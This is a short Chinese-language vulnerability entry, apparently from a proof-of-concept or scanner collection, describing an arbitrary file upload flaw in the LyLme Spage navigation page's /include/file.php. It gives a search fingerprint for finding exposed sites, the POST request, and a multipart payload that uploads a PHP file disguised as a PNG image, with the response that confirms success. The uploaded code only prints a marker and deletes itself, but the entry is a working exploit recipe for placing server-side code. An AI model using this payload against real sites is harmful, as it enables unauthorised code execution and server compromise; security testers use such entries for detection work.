# 六零导航页file.php任意文件上传漏洞

六零导航页file.php ｜ 文件上传 ｜ —
- **指纹**：`title=="上网导航 - LyLme Spage"`
- **请求**：`POST /include/file.php HTTP/1.1`

**Payload**
```
-----------------------------qttl7vemrsold314zg0f
Content-Disposition: form-data; name="file"; filename="dudesite.php"
Content-Type: image/png
<?php echo "dudesuite";unlink(__FILE__);?>
-----------------------------qttl7vemrsold314zg0f--
```
- **响应特征**：200 上传成功